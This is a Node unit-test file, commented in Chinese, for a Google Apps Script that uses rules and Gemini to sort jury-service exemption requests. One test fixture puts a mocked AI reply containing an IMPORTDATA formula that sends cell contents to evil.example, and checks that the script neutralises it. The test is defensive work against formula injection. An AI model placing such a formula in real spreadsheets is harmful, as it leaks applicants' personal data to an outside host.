// apps-script/Code.gs 的單元測試：用假的 SpreadsheetApp／UrlFetchApp 在 Node 裡執行 Apps Script。
// 示範「怎麼測一個只能在 Google 上跑的程式」：把 Google 的服務換成記憶體裡的假物件。
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const CODE = fs.readFileSync(path.join(__dirname, '..', 'apps-script', 'Code.gs'), 'utf8');
const HEAD = ['時間戳記', '候選人編號', '你的回覆', '勾選的事由', '具體情況說明'];

/* ---------- 假的 Google 服務 ---------- */
function makeSheet(name, rows) {
  const data = rows.map(r => r.slice());
  const sheet = {
    data, name, bg: {},
    getName: () => name,
    getLastRow: () => data.length,
    getLastColumn: () => Math.max(0, ...data.map(r => r.length)),
    getRange: (r, c, nr = 1, nc = 1) => range(sheet, r, c, nr, nc),
    getDataRange: () => range(sheet, 1, 1, Math.max(1, data.length), Math.max(1, sheet.getLastColumn())),
    clearContents: () => { data.length = 0; },
    insertRowBefore: () => { data.unshift([]); },
    setColumnWidth: () => {},
  };
  return sheet;
}
function range(sheet, r, c, nr, nc) {
  const d = sheet.data;
  const get = (i, j) => { const row = d[i - 1] || []; return row[j - 1] === undefined ? '' : row[j - 1]; };
  const set = (i, j, v) => { while (d.length < i) d.push([]); const row = d[i - 1]; while (row.length < j - 1) row.push(''); row[j - 1] = v; };
  const self = {
    getValue: () => get(r, c),
    setValue: v => { set(r, c, v); return self; },
    getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => get(r + i, c + j))),
    setValues: vals => { vals.forEach((row, i) => row.forEach((v, j) => set(r + i, c + j, v))); return self; },
    setBackground: col => { sheet.bg[r + ',' + c] = col; return self; },
    setFontWeight: () => self, setWrap: () => self,
  };
  return self;
}
function makeEnv({ rows = [], props = {}, llm = [], extraSheets = {} } = {}) {
  const sheets = [makeSheet('表單回應 1', [HEAD, ...rows])];
  for (const [n, r] of Object.entries(extraSheets)) sheets.push(makeSheet(n, r));
  const ss = {
    getSheets: () => sheets,
    getSheetByName: n => sheets.find(s => s.name === n) || null,
    insertSheet: n => { const s = makeSheet(n, []); sheets.push(s); return s; },
    toast: msg => { env.toasts.push(msg); },
    setActiveSheet: () => {},
  };
  const menu = { addItem: () => menu, addSeparator: () => menu, addToUi: () => {} };
  const env = {
    toasts: [], llmCalls: [], ss,
    SpreadsheetApp: { getActive: () => ss, getUi: () => ({ alert: () => {}, createMenu: () => menu }) },
    Utilities: { formatDate: () => '2026-11-04 10:00', sleep: () => {} },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => (k in props ? props[k] : null) }) },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: s => ({ body: s, setMimeType() { return this; } }) },
    UrlFetchApp: {
      fetch: (url, opt) => {
        env.llmCalls.push(JSON.parse(opt.payload).contents[0].parts[0].text);
        const next = llm.length ? llm.shift() : { code: 500, body: {} };
        return { getResponseCode: () => next.code, getContentText: () => JSON.stringify(next.body) };
      },
    },
  };
  vm.createContext(env);
  vm.runInContext(CODE, env);
  env.sheet = sheets[0];
  return env;
}
const geminiSays = obj => ({ code: 200, body: { candidates: [{ content: { parts: [{ text: JSON.stringify(obj) }] } }] } });
/** 讀某一列的 AI 欄位，回傳 {欄名: 值} */
function aiOf(env, row) {
  const head = env.sheet.data[0];
  const o = {};
  head.forEach((h, i) => { if (i >= HEAD.length) o[h] = env.sheet.data[row - 1][i]; });
  return o;
}
const submit = (env, row) => env.onFormSubmit({ range: { getSheet: () => env.sheet, getRow: () => row } });

/* ---------- 測試 ---------- */

test('規則判得了的申請：不呼叫 Gemini，標「規則」', () => {
  const env = makeEnv({ rows: [['2026/11/04', 'C055', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）']], props: { GEMINI_API_KEY: 'k' } });
  submit(env, 2);
  const ai = aiOf(env, 2);
  assert.equal(env.llmCalls.length, 0);
  assert.equal(ai['AI 對應事由'], '年滿七十歲以上');
  assert.equal(ai['判斷來源'], '規則');
  assert.equal(ai['需人工確認'], '否');
  assert.equal(ai['書記官待辦'], '核對身分證明後送法官', '附件只是自述，不能寫「可直接送法官」');
});

test('AI 回傳公式時，寫進試算表前要變成純文字（防公式注入）', () => {
  const env = makeEnv({
    rows: [['t', 'C023', '申請免除', '有重大疾病、傷害或身心因素', '上個月剛做完心臟手術。']],
    props: { GEMINI_API_KEY: 'k' },
    llm: [geminiSays({ '對應事由': '=IMPORTDATA("https://evil.example/?"&E2)', '類型': '得拒絕', 'AI建議': '可能符合', '需人工確認': '否', '理由': 'x', '書記官待辦': 'y' })],
  });
  submit(env, 2);
  const ai = aiOf(env, 2);
  assert.equal(env.llmCalls.length, 1);
  assert.match(env.llmCalls[0], /<申請內容>[\s\S]*心臟手術[\s\S]*<\/申請內容>/);
  assert.ok(ai['AI 對應事由'].startsWith("'="), '應該加上 \' 前綴：' + ai['AI 對應事由']);
  assert.equal(ai['需人工確認'], '是', '沒寫附件，AI 說「否」也不算');
});

test('非免除申請：標記略過，不呼叫 Gemini', () => {
  const env = makeEnv({ rows: [['t', 'C001', '到場', '', '']] });
  submit(env, 2);
  assert.equal(aiOf(env, 2)['AI 建議'], '（非免除申請，不需分類）');
  assert.equal(env.llmCalls.length, 0);
});

test('AI 失敗：標「待人工」，處理時間留空，之後補跑會再試', () => {
  const env = makeEnv({ rows: [['t', 'C046', '申請免除', '有重大疾病', '身體不好。']], props: { GEMINI_API_KEY: 'k' } });
  submit(env, 2); // 假 Gemini 一直回 500
  const ai = aiOf(env, 2);
  assert.equal(ai['判斷來源'], '待人工');
  assert.equal(ai['AI 處理時間'], '');
  assert.equal(ai['需人工確認'], '是');
});

test('候選人編號格式異常：一律人工確認', () => {
  const env = makeEnv({ rows: [['t', '王小明', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）']] });
  submit(env, 2);
  assert.equal(aiOf(env, 2)['需人工確認'], '是');
  assert.match(aiOf(env, 2)['書記官待辦'], /編號格式異常/);
});

test('題目順序改了也找得到欄位（用標題比對）', () => {
  const env = makeEnv({ rows: [] });
  env.sheet.data[0] = ['時間戳記', '具體情況說明', '候選人編號', '勾選的事由', '你的回覆'];
  env.sheet.data.push(['t', '我今年 72 歲。（附身分證影本）', 'C055', '年滿 70 歲以上', '申請免除']);
  submit(env, 2);
  const head = env.sheet.data[0];
  assert.equal(env.sheet.data[1][head.indexOf('AI 對應事由')], '年滿七十歲以上');
});

test('doGet：沒有存取碼或存取碼錯誤，不給資料', () => {
  const env = makeEnv({ rows: [['t', 'C001', '到場', '', '']], props: { DASHBOARD_TOKEN: 'secret-123' } });
  assert.equal(JSON.parse(env.doGet({ parameter: {} }).body).ok, false);
  assert.equal(JSON.parse(env.doGet({ parameter: { token: 'wrong' } }).body).ok, false);
  const ok = JSON.parse(env.doGet({ parameter: { token: 'secret-123' } }).body);
  assert.equal(ok.ok, true);
  assert.equal(ok.rows[0].id, 'C001');
  // 沒設定 DASHBOARD_TOKEN 時，任何存取碼（包含空字串）都不行
  const env2 = makeEnv({ rows: [['t', 'C001', '到場', '', '']] });
  assert.equal(JSON.parse(env2.doGet({ parameter: { token: '' } }).body).ok, false);
});

test('rebuildDashboard：輸出模組 4 格式，名冊上沒回覆的標「未回覆」', () => {
  const env = makeEnv({
    rows: [['t1', 'C001', '到場', '', ''], ['t2', 'C002', '尚未決定', '', ''], ['t3', 'C001', '申請免除', '年滿 70 歲以上', '我 75 歲（附身分證）']],
    extraSheets: { '通知名冊': [['候選人編號', '案號', '通知寄出日'], ['C001', '115年度國模重訴字第1號（模擬）', '2026/11/02'], ['C002', '同上', '2026/11/02'], ['C003', '同上', '2026/11/02']] },
  });
  env.rebuildDashboard();
  const rep = env.ss.getSheetByName('回覆資料').data;
  assert.deepEqual(rep[0], ['候選人編號', '案號', '通知寄出日', '回覆狀態', '回覆日期', '是否使用AI導覽', '免除事由（AI初篩）', '提問內容', '提問分類']);
  const status = Object.fromEntries(rep.slice(1).map(r => [r[0], r[3]]));
  assert.deepEqual(status, { C001: '申請免除', C002: '尚未決定', C003: '未回覆' }, '同一人回覆多次以最後一次為準');
  const fc = env.ss.getSheetByName('到場預測').data;
  assert.equal(fc[9][0], '預測到場人數');
  assert.match(fc[9][1], /^=ROUND/);
});

test('writeSummary：由程式統計，不呼叫 Gemini；同一人送出多次以最後一次為準', () => {
  const env = makeEnv({
    rows: [
      ['t1', 'C055', '申請免除', '年滿 70 歲以上', '我今年 72 歲。（附身分證影本）'],
      ['t2', 'C046', '申請免除', '有重大疾病、傷害或身心因素', '身體不好。'],
      ['t3', 'C090', '申請免除', '要照顧家人或養育小孩，執行職務有困難', '要照顧小孩。'],
      ['t4', 'C090', '到場', '', ''], // 撤回免除申請
    ],
    props: { GEMINI_API_KEY: 'k' },
  });
  env.classifyPending(); // 假 Gemini 一直回 500 → C046 待人工
  const calls = env.llmCalls.length;
  env.writeSummary();
  assert.equal(env.llmCalls.length, calls, '產生摘要不可以呼叫 Gemini');
  const text = env.ss.getSheetByName('書記官摘要').data[0][1];
  assert.match(text, /^共 2 筆免除申請/, 'C090 已改成到場，不算');
  assert.match(text, /C046：尚未分類/);
  assert.match(text, /核對附件後可送法官（1 筆）：C055/);
});
